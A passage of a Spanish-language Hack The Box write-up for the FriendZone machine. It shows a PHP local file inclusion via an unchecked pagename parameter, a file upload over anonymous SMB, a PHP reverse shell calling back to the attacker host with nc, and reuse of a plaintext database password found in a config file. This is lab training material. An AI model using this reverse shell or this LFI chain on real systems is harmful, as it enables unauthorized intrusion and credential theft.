-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
-
-&amp;lt;?php
-
-//echo &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;center&amp;gt;&amp;lt;h2&amp;gt;Smart photo script for friendzone corp !&amp;lt;/h2&amp;gt;&amp;lt;/center&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-//echo &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&amp;lt;/h3&amp;gt;&amp;lt;/center&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;title&amp;gt;FriendZone Admin !&amp;lt;/title&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$auth&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;FriendZoneAuth&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$auth&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;e7749d0f4b4da5d03e6e9196fd1d18f1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;){&lt;/span&gt;
- &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;center&amp;gt;&amp;lt;h2&amp;gt;Smart photo script for friendzone corp !&amp;lt;/h2&amp;gt;&amp;lt;/center&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&amp;lt;/h3&amp;gt;&amp;lt;/center&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;isset&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;image_id&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])){&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;image_name param is missed !&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;please enter it to show the image&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;default is image_id=a.jpg&amp;amp;pagename=timestamp&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
- &lt;span class=&quot;nv&quot;&gt;$image&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;image_id&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
- &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;center&amp;gt;&amp;lt;img src='images/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$image&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;'&amp;gt;&amp;lt;/center&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
- &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;Something went worng ! , the script include wrong param !&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
- include&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;pagename&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;.&lt;span class=&quot;s2&quot;&gt;&quot;.php&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
- //echo &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;pagename&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;You can't see the content ! , please login !&amp;lt;/center&amp;gt;&amp;lt;/p&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-?&amp;gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagename=php://filter/convert.base64-encode/resource=/var/www/uploads/upload.php&lt;/code&gt; En el cual podemos ver que realmente no se está haciendo nada y podría tratarse de un &lt;strong&gt;Rabbit Hole&lt;/strong&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PD9waHAKCi8vIG5vdCBmaW5pc2hlZCB5ZXQgLS0gZnJpZW5kem9uZSBhZG1pbiAhCgppZihpc3NldCgkX1BPU1RbImltYWdlIl0pKXsKCmVjaG8gIlVwbG9hZGVkIHN1Y2Nlc3NmdWxseSAhPGJyPiI7CmVjaG8gdGltZSgpKzM2MDA7Cn1lbHNlewoKZWNobyAiV0hBVCBBUkUgWU9VIFRSWUlORyBUTyBETyBIT09PT09PTUFOICEiOwoKfQoKPz4K&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
-
-&amp;lt;?php
-
-// not finished yet &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; friendzone admin &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;isset&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;image&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])){&lt;/span&gt;
-
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Uploaded successfully !&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;+3600&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;WHAT ARE YOU TRYING TO DO HOOOOOOMAN !&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Recapitulando un poco, podemos acceder a recursos php dentro del sistema desde el sitio web y tenemos un directorio en el servicio SMB en el cual contamos con permisos de escritura; así que podríamos tratar de subir un archivo php de prueba.&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Esto es una prueba&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient //10.10.10.123/Development &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
-Try &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt; to get a list of possible commands.
-smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                   D        0  Mon Dec  6 20:53:58 2021
-  ..                                  D        0  Wed Jan 23 15:51:02 2019
-
-                9221460 blocks of size 1024. 6460320 blocks available
-smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; put test.php
-putting file test.php as &lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;est.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.1 kb/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 0.1 kb/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                   D        0  Mon Dec  6 21:54:17 2021
-  ..                                  D        0  Wed Jan 23 15:51:02 2019
-  test.php                            A       37  Mon Dec  6 21:54:18 2021
-
-                9221460 blocks of size 1024. 6460316 blocks available
-smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y ahora, pensando un poco, vemos que el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Files&lt;/code&gt; del servicio SMB se encuentra en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/Files&lt;/code&gt;; asi que podriamos pensar que el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Development&lt;/code&gt; se encuentra en una ruta similar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/Development&lt;/code&gt;:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagename=/etc/Development/test&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-friendzone/friendzone-web9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Se nos interpreta nuestro código, así que ahora, vamos a entablarnos una reverse shell:&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-        &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.27 443 &amp;gt;/tmp/f&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient //10.10.10.123/Development &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
-Try &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt; to get a list of possible commands.
-smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; put shell.php
-putting file shell.php as &lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;hell.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.2 kb/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 0.2 kb/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                   D        0  Mon Dec  6 22:02:58 2021
-  ..                                  D        0  Wed Jan 23 15:51:02 2019
-  test.php                            A       37  Mon Dec  6 21:54:18 2021
-  shell.php                           A       98  Mon Dec  6 22:02:58 2021
-
-                9221460 blocks of size 1024. 6460296 blocks available
-smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Nos ponemos en escucha por el puerto 443 y tratamos de ingresar a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;amp;pagename=/etc/Development/shell&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.123] 43062
-/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
-$ whoami
-www-data
-$
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya nos encontramos dentro de la máquina y podemos visualizar la flag (user.txt). Para trabajar más cómodos, hacemos un &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt;. Ahora nos queda escalar privilegios, por lo que vamos a enumerar un poco el sistema.&lt;/p&gt;
-
-&lt;p&gt;Si checamos el directorio de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;, vemos algo interesante, un archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql_data.conf&lt;/code&gt;, así que vamos a echarle un ojo:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@FriendZone:/home/friend&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/www/
-www-data@FriendZone:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-total 28
-drwxr-xr-x 3 root root 4096 Jan 16  2019 admin
-drwxr-xr-x 4 root root 4096 Oct  6  2018 friendzone
-drwxr-xr-x 2 root root 4096 Oct  6  2018 friendzoneportal
-drwxr-xr-x 2 root root 4096 Jan 15  2019 friendzoneportaladmin
-drwxr-xr-x 3 root root 4096 Oct  6  2018 html
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root  116 Oct  6  2018 mysql_data.conf
-drwxr-xr-x 3 root root 4096 Oct  6  2018 uploads
-www-data@FriendZone:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;mysql_data.conf 
-&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;development process this is the mysql creds &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user friend
-
-&lt;span class=&quot;nv&quot;&gt;db_user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;friend
-
-&lt;span class=&quot;nv&quot;&gt;db_pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Agpyu12!0.213&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-
-&lt;span class=&quot;nv&quot;&gt;db_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FZ
-www-data@FriendZone:/var/www&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos unas credenciales del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;friend&lt;/code&gt; supuestamente del servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql&lt;/code&gt;; sin embargo, la utilidad no se encuentra instalada.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@FriendZone:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;which mysql
-www-data@FriendZone:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;bash
-root:x:0:0:root:/root:/bin/bash
-friend:x:1000:1000:friend,,,:/home/friend:/bin/bash
-www-data@FriendZone:/var/www&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Podríamos pensar que podrían ser las credenciales a nivel de sistema del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;friend&lt;/code&gt;, por lo que podríamos probar.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@FriendZone:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su friend
-Password: 
-friend@FriendZone:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;friend
-friend@FriendZone:/var/www&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Somos el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;friend&lt;/code&gt;. Ahora vamos a tratar de convertirnos en el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, por lo que enumeraremos un poco el sistema.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;friend@FriendZone:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;friend&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;friend&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;friend&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,24&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cdrom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,30&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dip&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,46&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;plugdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,111&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lpadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,112&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sambashare&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-friend@FriendZone:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;friend: 
-friend@FriendZone:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm 4000 2&amp;gt;/dev/null
-friend@FriendZone:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;opt/
